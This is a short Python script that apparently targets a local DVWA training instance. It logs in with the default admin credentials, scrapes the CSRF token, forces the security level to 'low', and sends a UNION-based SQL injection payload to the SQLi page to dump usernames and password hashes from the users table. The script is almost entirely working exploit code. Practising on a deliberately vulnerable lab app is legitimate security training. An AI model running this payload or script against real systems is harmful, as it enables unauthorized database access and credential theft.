
import requests
import re

s = requests.Session()

# Login
r = s.get("http://localhost:28080/login.php")
token = re.search(r"user_token['\s]*value=['\"]([^'\"]+)", r.text).group(1)
r = s.post("http://localhost:28080/login.php", data={
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}, allow_redirects=True)

# Clean and set cookies
for c in list(s.cookies):
    if c.name == 'security':
        s.cookies.clear(c.domain, c.path, c.name)
s.cookies.set("security", "low", domain="localhost", path="/")

# SQLi
r = s.get("http://localhost:28080/vulnerabilities/sqli/", params={
    "id": "' UNION SELECT user,password FROM users#",
    "Submit": "Submit"
})

# Find the vulnerable output section - look for "main_body" div content
idx = r.text.find('id="main_body"')
if idx > 0:
    snippet = r.text[idx:idx+2000]
    print("=== main_body section ===")
    print(snippet)
else:
    # Look for any output
    for marker in ["First name", "Surname", "vulnerability", "main_body"]:
        idx = r.text.find(marker)
        if idx >= 0:
            print(f"\n=== Found '{marker}' at pos {idx} ===")
            print(r.text[max(0,idx-100):idx+500])

